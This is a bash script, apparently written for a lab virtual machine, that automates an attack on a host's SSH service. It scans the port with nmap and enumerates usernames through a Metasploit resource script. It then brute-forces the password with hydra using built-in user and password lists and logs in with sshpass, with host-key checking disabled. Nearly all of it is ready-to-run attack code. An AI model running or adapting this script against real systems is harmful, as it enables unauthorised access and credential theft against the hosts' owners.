#!/bin/bash
echo "Starting the attack setup..."

echo "Checking the status of SSHPass..."
if ! command -v sshpass &> /dev/null
then
    echo "sshpass could not be found, installing..."
    sudo apt-get update &> /dev/null
    sudo apt-get install -y sshpass &> /dev/null
else
    echo "sshpass is already installed..."
fi

echo "Declaring variables..."
echo "Please enter the ip of the VM you want to attack:"
IP=$(cat /home/osboxes/ip.txt)
FILE1="users.txt"
FILE2="passwords.txt"
MSF_RC="msf_script.rc"
MSF_OUTPUT="msf_output.txt"
VALID_USERS="valid_users.txt"
echo "search ssh_enumusers" > $MSF_RC
echo "use 0" >> $MSF_RC
echo "set rhost $IP" >> $MSF_RC
echo "set user_file $FILE1" >> $MSF_RC
echo "set verbose true" >> $MSF_RC
echo "exploit" >> $MSF_RC
echo "exit" >> $MSF_RC
ORANGE='\033[0;33m'
NC='\033[0m'

echo "Checking SSH on the VM"
nmap -p 22 $IP -sV

echo "Creating and filling the users file..."
if [ -f "$FILE1" ]; then
    rm "$FILE1"
fi

USERS="root
msfadmin
administrator
guest
user
test
kali
osboxes
johndoe
janedoe
user123
admin
guest
testuser
osboxes.org
webmaster
support
info
cooluser
poweruser
techguru
superuser
geekyuser
hacker123
systemadmin
onlineuser
prouser
netizen
newbie
digitaluser
codeguru
internetuser
clouduser
socialuser
techuser
computeruser
username123
appuser
softwareuser
cyberuser
itadmin
forumuser
gamer123
networkuser
bloguser
mobileuser
devopsuser
linuxuser"

for USER in $USERS; do
    echo "$USER" >> "$FILE1"
done
echo "Users file has been created and filled..."


echo "Creating and filling the passwords file..."
if [ -f "$FILE2" ]; then
    rm "$FILE2"
fi

PASSWORDS="password123
welcome
admin123
osboxes
123456
osboxes.org
securepass
osboxes!
12345678
osboxes.org123
letmein
qwerty
osboxes.org2024
p@ssw0rd
pass123
iloveyou
osboxespassword
osboxes.orgpass
changeme
osboxes123
password123
welcome
admin123
123456
osboxes.org
securepass
osboxes!
12345678
osboxes.org123
letmein
qwerty
osboxes.org2024
p@ssw0rd
pass123
iloveyou
osboxespassword
osboxes.orgpass
changeme
osboxes123"

for PASSWORD in $PASSWORDS; do
    echo "$PASSWORD" >> "$FILE2"
done
echo "Passwords file has been created and filled..."

echo "Running Metasploit Framework with the resource script..."
msfconsole -q -r $MSF_RC > $MSF_OUTPUT

grep '\[+\].*found' $MSF_OUTPUT | sed -n "s/.*User '\([^']*\)' found/\1/p" | tail -n 1 > $VALID_USERS
echo "A user has been found, let's try and find his password..."

FOUNDUSER=$(cat valid_users.txt)
HYDRA_OUTPUT=$(hydra -l "$FOUNDUSER" -P "$FILE2" "$IP" -t 4 ssh)
PASSWORD=$(echo "$HYDRA_OUTPUT" | grep '\[ssh\]' | awk '{print $NF}')
echo $PASSWORD >> validpassword.txt


echo -e "${ORANGE}The found user and password are: $FOUNDUSER - $PASSWORD${NC}"
sudo rm msf_output.txt
sudo rm msf_script.rc

sshpass -p "$PASSWORD" ssh -tt -o StrictHostKeyChecking=no $FOUNDUSER@$IP